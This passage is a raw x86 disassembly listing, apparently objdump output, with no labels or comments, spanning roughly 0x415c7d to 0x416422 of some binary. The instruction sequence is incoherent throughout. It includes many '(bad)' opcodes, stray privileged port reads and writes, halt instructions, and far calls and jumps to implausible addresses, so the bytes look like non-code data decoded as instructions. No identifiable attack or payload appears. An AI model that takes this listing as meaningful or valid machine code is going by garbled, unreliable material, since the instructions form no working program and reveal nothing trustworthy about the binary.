  415c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c7e:	xor    DWORD PTR ds:0x1b806572,esi
  415c84:	lea    esi,[ecx+0x11]
  415c87:	retf   
  415c88:	mov    ds:0x4139a210,al
  415c8d:	lds    cx,DWORD PTR [ebx+0x40160167]
  415c94:	fnstsw WORD PTR [esi]
  415c96:	push   es
  415c97:	out    0x2e,al
  415c99:	test   BYTE PTR [eax+ecx*1-0x7c],0x4b
  415c9e:	mov    edi,0xc9ebaae1
  415ca3:	stc    
  415ca4:	pop    esi
  415ca5:	dec    esi
  415ca6:	mov    dl,BYTE PTR [edi]
  415ca8:	mov    dl,0x5c
  415caa:	hlt    
  415cab:	push   cs
  415cac:	retf   0x22b9
  415caf:	mov    dh,0x6f
  415cb1:	fimul  DWORD PTR [edx]
  415cb3:	inc    edi
  415cb4:	push   cs
  415cb5:	pop    edx
  415cb6:	push   es
  415cb7:	add    ebp,eax
  415cb9:	call   0x9925c382
  415cbe:	mov    bl,0xff
  415cc0:	jge    0x415ca4
  415cc2:	sub    ebp,ebp
  415cc4:	out    0xa5,al
  415cc6:	inc    esi
  415cc7:	mov    ah,0xfd
  415cc9:	(bad)  
  415ccb:	xchg   ebp,eax
  415ccc:	or     bl,BYTE PTR [ecx-0x4ea96325]
  415cd2:	call   FWORD PTR [ebp+eax*1-0x2e94f9df]
  415cd9:	mov    ebx,0xfd02e7bd
  415cde:	aas    
  415cdf:	and    DWORD PTR [ebp-0x33d2583],ebp
  415ce5:	push   edi
  415ce6:	(bad)  
  415ce7:	div    DWORD PTR [edx]
  415ce9:	pop    ebx
  415cea:	cdq    
  415ceb:	mul    eax
  415ced:	push   es
  415cee:	jne    0x415cd9
  415cf0:	xlat   BYTE PTR ds:[ebx]
  415cf1:	cmp    eax,0xcd8383bc
  415cf6:	xor    dl,BYTE PTR [eax+0x65]
  415cf9:	pop    ebx
  415cfa:	out    0xe5,al
  415cfc:	cmp    BYTE PTR [esi-0x69fce283],bl
  415d02:	hlt    
  415d03:	dec    esi
  415d04:	stc    
  415d05:	xchg   ecx,eax
  415d06:	gs mov ebp,0xdcfa19aa
  415d0c:	mov    DWORD PTR [edx-0x7],0xca07392
  415d13:	xchg   esi,eax
  415d14:	mov    ecx,0xa3304a6f
  415d19:	and    ebp,DWORD PTR [edx+0x2220b0de]
  415d1f:	mov    al,ds:0x80c95278
  415d24:	add    BYTE PTR [edx],ch
  415d26:	pop    ecx
  415d27:	pop    edx
  415d28:	sbb    al,0x68
  415d2a:	popa   
  415d2b:	icebp  
  415d2c:	(bad)  
  415d2d:	fimul  DWORD PTR [ebx]
  415d2f:	mov    cl,BYTE PTR [edx+0x2a]
  415d32:	mov    eax,0xac5cdbeb
  415d37:	outs   dx,DWORD PTR ds:[esi]
  415d38:	lods   eax,DWORD PTR ds:[esi]
  415d39:	adc    bh,ah
  415d3b:	jns    0x415d02
  415d3d:	push   esi
  415d3e:	data16 add al,0x4c
  415d41:	jb     0x415d70
  415d43:	popf   
  415d44:	lahf   
  415d45:	and    eax,0x7b2b54a
  415d4a:	push   0xc97486f
  415d4f:	outs   dx,DWORD PTR ds:[esi]
  415d50:	dec    ecx
  415d51:	es ins DWORD PTR es:[edi],dx
  415d53:	in     al,dx
  415d54:	rcl    ch,cl
  415d56:	addr16 div al
  415d59:	sub    DWORD PTR [edx],ecx
  415d5b:	pop    ebp
  415d5c:	pop    edi
  415d5d:	jns    0x415d07
  415d5f:	sub    DWORD PTR [ecx-0x23],eax
  415d62:	xor    BYTE PTR [ecx-0x5c748517],dl
  415d68:	xor    eax,0x51adbb7
  415d6d:	jge    0x415dbf
  415d6f:	hlt    
  415d70:	jae    0x415d67
  415d72:	shr    ecx,0x77
  415d75:	jmp    0x7851:0x188da734
  415d7c:	jne    0x415dc3
  415d7e:	nop
  415d7f:	xor    eax,0x82247f3
  415d84:	test   DWORD PTR [ebx-0x69af53b9],0x1bec0969
  415d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d8f:	xchg   edi,eax
  415d90:	sti    
  415d91:	clc    
  415d92:	jg     0x415d37
  415d94:	push   esp
  415d95:	cs popf 
  415d97:	xchg   ecx,eax
  415d98:	xor    cl,BYTE PTR [ebx]
  415d9a:	dec    esp
  415d9b:	dec    esi
  415d9c:	cmp    al,0xc6
  415d9e:	cdq    
  415d9f:	dec    edx
  415da0:	dec    esi
  415da1:	stos   DWORD PTR es:[edi],eax
  415da2:	sub    bh,0x4b
  415da5:	jg     0x415d6c
  415da7:	sbb    eax,0x9f92dc19
  415dac:	aas    
  415dad:	ins    BYTE PTR es:[edi],dx
  415dae:	sar    BYTE PTR [ebx+edx*8+0xdeae322],0xba
  415db6:	popf   
  415db7:	jp     0x415d3c
  415db9:	mov    bl,BYTE PTR [eax-0x3a]
  415dbc:	jbe    0x415dce
  415dbe:	addr16 jae 0x415dad
  415dc1:	gs push ebp
  415dc3:	xor    DWORD PTR [edi+0x20],edx
  415dc6:	(bad)  
  415dc7:	rcl    BYTE PTR [edi],cl
  415dc9:	dec    edi
  415dca:	popa   
  415dcb:	pop    es
  415dcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dcd:	add    ah,BYTE PTR [edi-0x5b]
  415dd0:	pop    es
  415dd1:	mov    dl,0x23
  415dd3:	push   ds
  415dd4:	shr    cl,1
  415dd6:	sub    eax,0x9d814347
  415ddb:	int3   
  415ddc:	popf   
  415ddd:	dec    ebp
  415dde:	sbb    cl,ch
  415de0:	shr    ebx,cl
  415de2:	sbb    eax,0x8e0ee143
  415de7:	js     0x415df6
  415de9:	inc    ebp
  415dea:	inc    eax
  415deb:	inc    DWORD PTR [eax+ebx*1]
  415dee:	pop    es
  415def:	pusha  
  415df0:	out    0x91,al
  415df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415df3:	(bad)  
  415df4:	in     al,dx
  415df5:	test   BYTE PTR [ecx-0x45],dh
  415df8:	add    ecx,DWORD PTR [ebx]
  415dfa:	inc    ebp
  415dfb:	cmp    al,BYTE PTR [ebx-0x5b]
  415dfe:	adc    eax,0x7859847
  415e03:	mov    DWORD PTR [ebp-0x10],eax
  415e06:	sub    ecx,ecx
  415e08:	mov    eax,DWORD PTR [ebp+0x8]
  415e0b:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  415e12:	jmp    0x416324
  415e17:	cmp    al,0xd2
  415e19:	retf   
  415e1a:	rcr    ecx,0xd9
  415e1d:	retf   0x8d1
  415e20:	iret   
  415e21:	adc    eax,0x4084e725
  415e26:	adc    al,0xfd
  415e28:	cmp    BYTE PTR [edi+0x78],bh
  415e2b:	jae    0x415ea9
  415e2d:	js     0x415ea7
  415e2f:	arpl   WORD PTR [edi],sp
  415e31:	push   eax
  415e32:	dec    eax
  415e33:	inc    ebx
  415e34:	cmc    
  415e35:	dec    eax
  415e36:	test   al,0xb0
  415e38:	sub    al,0x4a
  415e3a:	les    ecx,FWORD PTR [esi-0x1fa69505]
  415e40:	push   es
  415e41:	pop    ecx
  415e42:	rcl    BYTE PTR [ebx+0x58],1
  415e45:	xchg   edi,eax
  415e46:	xchg   esp,eax
  415e47:	cs xchg ebx,eax
  415e49:	cmp    edi,DWORD PTR [esi-0x379a4c28]
  415e4f:	pop    esi
  415e50:	pusha  
  415e51:	sbb    cl,BYTE PTR [ebp+0x61]
  415e54:	push   eax
  415e55:	out    dx,al
  415e56:	xchg   BYTE PTR [edx-0x57],bl
  415e59:	imul   ebx,DWORD PTR [ebx+eax*4],0xffffffd5
  415e5d:	pushf  
  415e5e:	lods   al,BYTE PTR ds:[esi]
  415e5f:	jo     0x415e71
  415e61:	xor    DWORD PTR [ecx-0x2a2888ac],eax
  415e67:	sbb    ebp,DWORD PTR [edi*4-0x4e337f97]
  415e6e:	xchg   edi,eax
  415e6f:	in     eax,0xb
  415e71:	mov    edx,0xce3caaca
  415e76:	pop    eax
  415e77:	and    dh,BYTE PTR [ecx+0x40]
  415e7a:	jnp    0x415e5a
  415e7c:	jp     0x415e70
  415e7e:	(bad)  
  415e7f:	lods   eax,DWORD PTR ds:[esi]
  415e80:	popf   
  415e81:	and    ebx,0x64112607
  415e87:	mov    WORD PTR fs:[ebx],ds
  415e8a:	addr16 pop ecx
  415e8c:	cmp    eax,0xe04de2a1
  415e91:	call   0xd488:0xc39101cc
  415e98:	adc    eax,0x3fee7aaf
  415e9d:	jbe    0x415f0c
  415e9f:	xchg   BYTE PTR [ebx-0x7c951394],bl
  415ea5:	mov    BYTE PTR [eax+0x33],cl
  415ea8:	loope  0x415eff
  415eaa:	mov    cl,0x69
  415eac:	mov    bh,0xd1
  415eae:	push   es
  415eaf:	jns    0x415e59
  415eb1:	push   edx
  415eb2:	ins    DWORD PTR es:[edi],dx
  415eb3:	sbb    edx,DWORD PTR [ebp-0x2ebe5ada]
  415eb9:	das    
  415eba:	out    0x17,al
  415ebc:	rcl    DWORD PTR [eax],1
  415ebe:	xor    al,0xa7
  415ec0:	call   0xc37:0x79eef37e
  415ec7:	sub    DWORD PTR [edx+ebp*4+0x3c],ebx
  415ecb:	das    
  415ecc:	sbb    dh,bh
  415ece:	inc    edi
  415ecf:	mov    ecx,DWORD PTR [eax*8+0x4dc7ac3]
  415ed6:	shl    BYTE PTR [ecx-0x60],0xfb
  415eda:	push   eax
  415edb:	adc    DWORD PTR [esi],edi
  415edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ede:	fwait
  415edf:	cmp    eax,0xbb629933
  415ee4:	dec    esp
  415ee5:	mov    DWORD PTR [eax+edx*4-0x64177877],0x7da07e8e
  415ef0:	pop    ecx
  415ef1:	adc    ebx,DWORD PTR [eax+0x5f]
  415ef4:	or     DWORD PTR [ecx+0x3b],edx
  415ef7:	jne    0x415ef3
  415ef9:	dec    ebp
  415efa:	mov    DWORD PTR [ebp+eiz*4+0x69],ebx
  415efe:	adc    eax,0xc3aa330
  415f03:	pop    ebp
  415f04:	xor    BYTE PTR [edx+0x78fd2f42],cl
  415f0a:	add    BYTE PTR [edx],dl
  415f0c:	aam    0x1e
  415f0e:	(bad)  
  415f0f:	mov    ebp,0xe9028481
  415f14:	rol    DWORD PTR [edi-0x6d],cl
  415f17:	enter  0x404a,0x1e
  415f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f1c:	sbb    BYTE PTR [edx-0x44],0x90
  415f20:	sub    dl,bl
  415f22:	push   ebx
  415f23:	mov    al,ds:0x36c1881
  415f28:	sbb    DWORD PTR ds:0x454a1581,edx
  415f2e:	pusha  
  415f2f:	mov    bh,0x29
  415f31:	shl    ch,1
  415f33:	lahf   
  415f34:	push   edx
  415f35:	scas   eax,DWORD PTR es:[edi]
  415f36:	add    eax,0xbe179882
  415f3b:	mov    BYTE PTR [esi-0x58885ac9],bl
  415f41:	sub    al,0x67
  415f43:	bound  ecx,QWORD PTR [esi-0x6bdafc93]
  415f49:	sbb    DWORD PTR [ebx+0xfcfe32d],ebp
  415f4f:	shl    ah,1
  415f51:	mov    bh,0x52
  415f53:	and    edi,eax
  415f55:	fcom   DWORD PTR [edi+0x79]
  415f58:	mov    esi,0x6ec155a7
  415f5d:	ins    BYTE PTR es:[edi],dx
  415f5e:	cwde   
  415f5f:	mov    esp,0xbc8086d8
  415f64:	inc    edx
  415f65:	out    0x93,eax
  415f67:	sbb    ah,BYTE PTR [edi]
  415f69:	inc    ecx
  415f6a:	mov    edx,0x942084e5
  415f6f:	xor    eax,0xa61087ba
  415f74:	sub    al,0x37
  415f76:	sti    
  415f77:	(bad)  
  415f78:	out    0x12,eax
  415f7a:	sub    cl,bh
  415f7c:	hlt    
  415f7d:	in     al,0x97
  415f7f:	mov    ds:0xcdb33117,al
  415f84:	add    DWORD PTR [esi+eax*2+0x37],eax
  415f88:	es cmc 
  415f8a:	fwait
  415f8b:	test   eax,0x470bbf38
  415f90:	jbe    0x415fc8
  415f92:	js     0x415fd2
  415f94:	enter  0xc192,0x44
  415f98:	xchg   esi,eax
  415f99:	mov    DWORD PTR [ebp+ebx*8-0x5bbe00c7],edx
  415fa0:	and    esi,DWORD PTR [esi-0x36]
  415fa3:	sbb    BYTE PTR [eax+edx*1],dh
  415fa6:	rcl    dh,1
  415fa8:	cs sahf 
  415faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fab:	add    cl,BYTE PTR [esi-0xac2a7c2]
  415fb1:	pop    ebp
  415fb2:	mov    bl,0x18
  415fb4:	cmp    DWORD PTR ds:0xe71bd5b5,0xb5a3fbdc
  415fbe:	fidivr DWORD PTR [ecx+0x72]
  415fc1:	sahf   
  415fc2:	imul   BYTE PTR [ebx]
  415fc4:	popf   
  415fc5:	push   cs
  415fc6:	jb     0x416027
  415fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fc9:	aam    0x4c
  415fcb:	out    0x9f,al
  415fcd:	in     eax,0x83
  415fcf:	push   ss
  415fd0:	xlat   BYTE PTR ds:[ebx]
  415fd1:	clc    
  415fd2:	or     al,0x1e
  415fd4:	inc    edi
  415fd5:	mov    ah,0xcb
  415fd7:	popa   
  415fd8:	ret    0x5fa6
  415fdb:	adc    al,0x90
  415fdd:	gs retf 
  415fdf:	mov    bl,BYTE PTR [ebp+0x5a337577]
  415fe5:	rcr    edx,0x54
  415fe8:	push   es
  415fe9:	mov    ebp,0xa45d16f1
  415fee:	push   edi
  415fef:	mov    dl,0x19
  415ff1:	ja     0x416034
  415ff3:	lods   al,BYTE PTR ds:[esi]
  415ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ff5:	stos   DWORD PTR es:[edi],eax
  415ff6:	push   ebx
  415ff7:	mov    dh,0x2c
  415ff9:	mov    DWORD PTR [eax],eax
  415ffb:	stos   BYTE PTR es:[edi],al
  415ffc:	ficomp WORD PTR [edx+0x347aa3b9]
  416002:	loope  0x41603a
  416004:	sub    BYTE PTR [esi-0x4ec1ce5d],0xa
  41600b:	dec    eax
  41600c:	jmp    0x78ac77bb
  416011:	pop    esp
  416012:	lock pop edi
  416014:	int3   
  416015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416016:	in     eax,dx
  416017:	push   esp
  416018:	sbb    dl,bh
  41601a:	add    dh,0x6a
  41601d:	in     al,dx
  41601e:	push   cs
  41601f:	or     eax,0x838bdd0d
  416024:	lods   al,BYTE PTR ds:[esi]
  416025:	xor    DWORD PTR [edi],ebp
  416027:	mov    eax,0x8420f58
  41602c:	sub    BYTE PTR [edi+ecx*1+0x4f],0xe3
  416031:	fiadd  WORD PTR gs:[esi-0x49]
  416035:	(bad)  
  416036:	sub    al,BYTE PTR [esi+0x19abfd86]
  41603c:	xor    cl,BYTE PTR [ecx-0x733e406a]
  416042:	cmp    BYTE PTR [eax+0x45],bh
  416045:	dec    ecx
  416046:	push   es
  416047:	popa   
  416048:	mov    eax,ds:0x4163f572
  41604d:	jns    0x41605e
  41604f:	pop    ecx
  416050:	imul   BYTE PTR [edi+0x238efe0]
  416056:	mov    eax,ds:0xac6c6a3e
  41605b:	xor    DWORD PTR [ebp-0x2f],0x77
  41605f:	mov    ebx,0x8b014462
  416064:	and    al,0x58
  416066:	aad    0xbe
  416068:	adc    DWORD PTR [ebx],edx
  41606a:	das    
  41606b:	pop    ebx
  41606c:	test   BYTE PTR [ecx+edi*4+0x3b],bh
  416070:	das    
  416071:	repnz sub esi,DWORD PTR [eax+esi*1+0x79c61f12]
  416079:	xchg   ebx,eax
  41607a:	aam    0x1f
  41607c:	addr16 mov bh,0xbb
  41607f:	int3   
  416080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416081:	dec    ecx
  416082:	shr    BYTE PTR [ebx],1
  416084:	jp     0x416037
  416086:	or     DWORD PTR [esp+ecx*2-0x5a],esi
  41608a:	sbb    DWORD PTR [ecx+0x6b],ecx
  41608d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41608e:	ins    DWORD PTR es:[edi],dx
  41608f:	jne    0x416046
  416091:	pop    edx
  416092:	mov    al,0xcc
  416094:	pop    edi
  416095:	mov    al,ds:0xc649df03
  41609a:	push   ss
  41609b:	enter  0xeca0,0x16
  41609f:	cmp    ch,al
  4160a1:	arpl   bx,dx
  4160a3:	add    al,BYTE PTR [edx+0x77]
  4160a6:	mov    esp,0x28a3c5dd
  4160ab:	cwde   
  4160ac:	jb     0x4160b0
  4160ae:	(bad)  
  4160af:	fdiv   DWORD PTR [ebx-0x45]
  4160b2:	popf   
  4160b3:	mov    ecx,0x33a9924d
  4160b8:	pusha  
  4160b9:	and    eax,0xf509becc
  4160be:	neg    DWORD PTR [edi]
  4160c0:	xlat   BYTE PTR ds:[ebx]
  4160c1:	pop    es
  4160c2:	pop    edi
  4160c3:	arpl   WORD PTR [edi],sp
  4160c5:	or     al,0x76
  4160c7:	iret   
  4160c8:	inc    ecx
  4160c9:	in     al,0x10
  4160cb:	push   ss
  4160cc:	ins    DWORD PTR es:[edi],dx
  4160cd:	rcl    BYTE PTR ds:0xc120a1b0,0x47
  4160d4:	ins    BYTE PTR es:[edi],dx
  4160d5:	jb     0x416112
  4160d7:	or     cl,ch
  4160d9:	aaa    
  4160da:	ins    BYTE PTR es:[edi],dx
  4160db:	lods   al,BYTE PTR ds:[esi]
  4160dc:	sbb    eax,0x37740072
  4160e1:	test   eax,0x3df9d47c
  4160e6:	jecxz  0x41608c
  4160e8:	jge    0x416074
  4160ea:	xor    ecx,DWORD PTR [eax+0x28da4cad]
  4160f0:	pop    esi
  4160f1:	xchg   edx,eax
  4160f2:	mov    dl,0xdd
  4160f4:	inc    ebx
  4160f5:	fist   DWORD PTR [eax-0x2c63b278]
  4160fb:	scas   eax,DWORD PTR es:[edi]
  4160fc:	dec    edi
  4160fd:	cmp    al,0xdc
  4160ff:	cmp    bh,cl
  416101:	pop    edi
  416102:	cli    
  416103:	(bad)  
  416104:	test   DWORD PTR [edi+0x4e382fd8],ebx
  41610a:	ins    DWORD PTR es:[edi],dx
  41610b:	fcomp  DWORD PTR [ebx-0x2d]
  41610e:	paddsb mm5,QWORD PTR [ebx]
  416111:	js     0x41616f
  416113:	push   ecx
  416114:	and    edi,esi
  416116:	and    DWORD PTR [ebx-0xf],eax
  416119:	xlat   BYTE PTR ds:[ebx]
  41611a:	jae    0x416113
  41611c:	addr16 push ecx
  41611e:	call   DWORD PTR [eax-0x1c]
  416121:	xchg   ebp,eax
  416122:	stc    
  416123:	andnps xmm7,xmm6
  416126:	cdq    
  416127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416128:	xlat   BYTE PTR ds:[ebx]
  416129:	test   eax,0xbc84c5a8
  41612e:	inc    ecx
  41612f:	xor    bl,dl
  416131:	dec    eax
  416132:	mov    ds:0xc82bc3ad,al
  416137:	scas   eax,DWORD PTR es:[edi]
  416138:	fst    DWORD PTR [ecx]
  41613a:	pop    es
  41613b:	xor    al,0x82
  41613d:	xchg   BYTE PTR [eax+0x5473a69c],ch
  416143:	xchg   BYTE PTR [esi+eax*8-0x80],ch
  416147:	mov    WORD PTR [ecx-0x5145d8b9],cs
  41614d:	push   ds
  41614e:	mul    BYTE PTR [ecx-0x3137571b]
  416154:	dec    edi
  416155:	dec    esp
  416156:	int3   
  416157:	mov    edi,0x20d0a675
  41615c:	mov    cl,0x92
  41615e:	push   ss
  41615f:	loop   0x4161a8
  416161:	ja     0x416185
  416163:	aaa    
  416164:	es and eax,0x9bb92fe0
  41616a:	inc    ecx
  41616b:	pop    edi
  41616c:	das    
  41616d:	arpl   WORD PTR [esp+ebp*8],bp
  416170:	fisubr WORD PTR [ebp+0x1a979c6e]
  416176:	xchg   ecx,eax
  416177:	dec    esp
  416178:	iret   
  416179:	adc    DWORD PTR [ebx],eax
  41617b:	and    esp,DWORD PTR [ecx-0x64d02051]
  416181:	stc    
  416182:	xor    bl,BYTE PTR [eax+ebp*8+0x7d76cbdc]
  416189:	ret    0xab27
  41618c:	shr    DWORD PTR [edi-0x3cc3ac87],0x55
  416193:	pop    ds
  416194:	push   ds
  416195:	retf   0xe51b
  416198:	retf   0xf143
  41619b:	push   eax
  41619c:	ins    BYTE PTR es:[edi],dx
  41619d:	popa   
  41619e:	popa   
  41619f:	bnd jno 0x4161c0
  4161a2:	stc    
  4161a3:	jg     0x4161c1
  4161a5:	pop    esi
  4161a6:	push   ds
  4161a7:	push   0x62355d05
  4161ac:	xchg   ecx,eax
  4161ad:	mov    ch,0xf3
  4161af:	aam    0x3b
  4161b1:	jmp    0x4161bc
  4161b3:	aam    0xc6
  4161b5:	retf   
  4161b6:	mov    edi,0xb846da70
  4161bb:	push   ds
  4161bc:	cld    
  4161bd:	stos   DWORD PTR es:[edi],eax
  4161be:	pop    ecx
  4161bf:	loopne 0x416162
  4161c1:	rcr    bl,1
  4161c3:	cld    
  4161c4:	popa   
  4161c5:	push   esi
  4161c6:	fisubr WORD PTR [ebp+0xe]
  4161c9:	dec    ebp
  4161ca:	add    eax,0x5a5804cb
  4161cf:	add    cl,BYTE PTR [eax-0x486c6e49]
  4161d5:	and    bl,0x74
  4161d8:	xlat   BYTE PTR ds:[ebx]
  4161d9:	jp     0x416168
  4161db:	push   edi
  4161dc:	test   DWORD PTR [eax-0x7e],ebp
  4161df:	lock add bh,bl
  4161e2:	push   0xc672aad4
  4161e7:	dec    ebp
  4161e8:	mov    eax,ds:0x73db28a7
  4161ed:	xchg   BYTE PTR [edi+0x28],ah
  4161f0:	jmp    0x416265
  4161f2:	fwait
  4161f3:	cmc    
  4161f4:	(bad)  
  4161f5:	call   esp
  4161f7:	jo     0x416185
  4161f9:	sbb    ebx,DWORD PTR [eax+0x660a7e01]
  4161ff:	sbb    bl,BYTE PTR [eax]
  416201:	test   eax,0x80fa42da
  416206:	das    
  416207:	imul   ebp,DWORD PTR [eax-0x332e1a1],0x68
  41620e:	jb     0x4161c4
  416210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416211:	dec    eax
  416212:	outs   dx,BYTE PTR ds:[esi]
  416213:	pop    ecx
  416214:	mov    ebp,DWORD PTR [edi+edi*1-0x62030170]
  41621b:	(bad)
  41621f:	test   BYTE PTR [ebx+edi*2+0x2e9c4972],ch
  416226:	pop    ecx
  416227:	or     dh,BYTE PTR [ecx-0x43]
  41622a:	mov    esp,0x1e295a60
  41622f:	push   ebx
  416230:	xchg   ebx,eax
  416231:	jb     0x4161c5
  416233:	push   ebp
  416234:	mov    al,0xce
  416236:	and    BYTE PTR [esi],cl
  416238:	jne    0x416244
  41623a:	xchg   cl,ah
  41623c:	js     0x416204
  41623e:	lods   eax,DWORD PTR ss:[esi]
  416240:	xchg   DWORD PTR [ebx+0x76d5f549],edx
  416246:	sbb    DWORD PTR [ebp-0x60],0x5e240517
  41624d:	scas   al,BYTE PTR es:[edi]
  41624e:	and    esi,DWORD PTR [edi+0x1b]
  416251:	push   ds
  416252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416253:	mov    al,ds:0xb790f85d
  416258:	mov    bh,0xf5
  41625a:	and    cl,ah
  41625c:	push   esi
  41625d:	inc    ebx
  41625e:	mov    eax,0x92116ec5
  416263:	pop    esp
  416264:	jp     0x4162bb
  416266:	fdiv   DWORD PTR [eax]
  416268:	inc    esp
  416269:	inc    edx
  41626a:	xlat   BYTE PTR ds:[ebx]
  41626b:	mov    esi,0x4dbee3ca
  416270:	pusha  
  416271:	cld    
  416272:	lahf   
  416273:	imul   ecx,DWORD PTR [edx-0x3abcb9f2],0xd45d8149
  41627d:	mov    ecx,0xaf4d9428
  416282:	lds    esp,FWORD PTR [ecx-0x46e445e5]
  416288:	sbb    al,0x8c
  41628a:	ds pop ds
  41628c:	bnd jno 0x416211
  41628f:	jg     0x4162f7
  416291:	out    0x62,al
  416293:	inc    edx
  416294:	adc    al,0x1c
  416296:	test   al,0x8e
  416298:	(bad)  
  416299:	pop    edi
  41629a:	cmc    
  41629b:	fstp   TBYTE PTR [esi-0x32]
  41629e:	fistp  WORD PTR [edi-0xec2c61b]
  4162a4:	rcr    al,1
  4162a6:	adc    DWORD PTR [edx],0x610d509c
  4162ac:	stos   BYTE PTR es:[edi],al
  4162ad:	add    al,0x4c
  4162af:	xor    DWORD PTR [eax+0x47],esi
  4162b2:	inc    ebx
  4162b3:	mov    edi,0x58998580
  4162b8:	push   ecx
  4162b9:	xor    ah,BYTE PTR [edx+ebp*8+0x23]
  4162bd:	in     eax,dx
  4162be:	jle    0x416270
  4162c0:	push   esi
  4162c1:	outs   dx,BYTE PTR ds:[esi]
  4162c2:	sbb    bh,BYTE PTR [esi-0x25]
  4162c5:	sar    edx,0xe5
  4162c8:	add    eax,0x97d46c2
  4162cd:	leave  
  4162ce:	cmp    ah,BYTE PTR [eax-0x27]
  4162d1:	call   esp
  4162d3:	cmp    ch,cl
  4162d5:	stc    
  4162d6:	mov    ds:0x6cc72112,eax
  4162db:	in     eax,dx
  4162dc:	push   ebx
  4162dd:	fadd   DWORD PTR [edi]
  4162df:	cs cwde 
  4162e1:	vpshlb xmm3,[ebx],xmm2
  4162e6:	stos   DWORD PTR es:[edi],eax
  4162e7:	fiadd  WORD PTR [esi+0x3]
  4162ea:	inc    edx
  4162eb:	cmp    DWORD PTR [edi+edx*4+0x72],ecx
  4162ef:	sti    
  4162f0:	pslld  mm4,mm0
  4162f3:	in     eax,dx
  4162f4:	adc    eax,0xb044391
  4162f9:	mov    bh,0xd6
  4162fb:	add    BYTE PTR [edi],cl
  4162fd:	jnp    0x41635b
  4162ff:	int3   
  416300:	test   DWORD PTR [ecx+ebx*8],ebp
  416303:	clc    
  416304:	or     esp,DWORD PTR [ecx+0x5a6f5901]
  41630a:	push   ss
  41630b:	cmc    
  41630c:	call   0x15a2:0x3205efa0
  416313:	sahf   
  416314:	cmp    BYTE PTR [ecx+0xec20657],dl
  41631a:	adc    BYTE PTR [ecx-0x45f29b86],dh
  416320:	pop    edx
  416321:	push   edi
  416322:	shr    DWORD PTR [eax],0xc7
  416325:	inc    ebp
  416326:	loopne 0x416361
  416328:	test   DWORD PTR [eax+edi*8-0x5d42ea75],ebx
  41632f:	inc    edx
  416330:	add    BYTE PTR [ecx],dh
  416332:	adc    eax,0x42a39d
  416337:	jmp    0x416849
  41633c:	aas    
  41633d:	enter  0xc7c2,0xd1
  416341:	fxch   st(1)
  416343:	rcl    BYTE PTR [eax],1
  416345:	fistp  DWORD PTR [edi+0x6e4da6fe]
  41634b:	enter  0xc3f0,0x7f
  41634f:	js     0x4163c4
  416351:	jl     0x4163cb
  416353:	js     0x41638d
  416355:	pusha  
  416356:	xor    DWORD PTR [edx+ebp*1+0x5dfd5b92],edi
  41635d:	xor    bl,BYTE PTR [eax]
  41635f:	les    ebx,FWORD PTR [edi-0x798ecafe]
  416365:	hlt    
  416366:	pop    esi
  416367:	adc    bh,bh
  416369:	addr16 jae 0x416356
  41636c:	add    al,BYTE PTR [edi-0x2b]
  41636f:	ins    DWORD PTR es:[edi],dx
  416370:	xor    dl,dl
  416372:	ds pop ebx
  416374:	fs mov esi,0x5b6029db
  41637a:	jbe    0x4163b2
  41637c:	icebp  
  41637d:	test   BYTE PTR [esi],bh
  41637f:	retf   0xf7fd
  416382:	imul   ebp,DWORD PTR [ebp+0x1630d584],0xffffffd2
  416389:	(bad)  
  41638b:	pop    ebp
  41638c:	pop    esp
  41638d:	sbb    al,dl
  41638f:	out    dx,al
  416390:	rcr    DWORD PTR [ecx-0x41],0xac
  416394:	adc    eax,0x6774d601
  416399:	jge    0x416414
  41639b:	int3   
  41639c:	cmp    DWORD PTR [edi+edi*1],eax
  41639f:	data16 mov ss,WORD PTR [edi-0x584a94ac]
  4163a6:	add    BYTE PTR [ebx-0x5d11bd99],dh
  4163ac:	sub    BYTE PTR [esi+0x5a],0x9a
  4163b0:	xchg   edi,eax
  4163b1:	(bad)  
  4163b2:	jp     0x416412
  4163b4:	fwait
  4163b5:	push   ebx
  4163b6:	rcl    bl,0x97
  4163b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ba:	call   0xb46e362f
  4163bf:	shl    DWORD PTR [eax],cl
  4163c1:	bound  esp,QWORD PTR [esi+0x7102ff8]
  4163c7:	and    DWORD PTR [eax],eax
  4163c9:	jmp    0x1572:0x24b955b2
  4163d0:	sub    BYTE PTR ds:0xb63d3c4,bl
  4163d6:	leave  
  4163d7:	ret    
  4163d8:	push   eax
  4163d9:	fcomi  st,st(3)
  4163db:	jg     0x41638d
  4163dd:	clc    
  4163de:	shl    bh,0x1a
  4163e1:	sub    DWORD PTR [esi],esi
  4163e3:	sub    DWORD PTR [eax],esp
  4163e5:	es jmp 0x416461
  4163e8:	sbb    eax,eax
  4163ea:	and    ah,dl
  4163ec:	pop    edi
  4163ed:	inc    edi
  4163ee:	cld    
  4163ef:	iret   
  4163f0:	jmp    0x416383
  4163f2:	fstp   DWORD PTR [ebx+eiz*4]
  4163f5:	out    0xc1,eax
  4163f7:	adc    al,0x89
  4163f9:	sbb    edx,DWORD PTR [ecx]
  4163fb:	lods   al,BYTE PTR ds:[esi]
  4163fc:	js     0x4163a0
  4163fe:	popf   
  4163ff:	and    DWORD PTR [esi-0x1392c5a3],esi
  416405:	mov    ds:0x3941870e,al
  41640a:	sub    BYTE PTR [eax+0x71],0xbd
  41640e:	mov    BYTE PTR [ebx],0xa7
  416411:	rcr    esp,cl
  416413:	jp     0x4163eb
  416415:	mov    eax,ds:0x4a837192
  41641a:	(bad)  [edx]
  41641c:	enter  0x1a2b,0x22
  416420:	or     DWORD PTR [ecx],ebp
  416422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
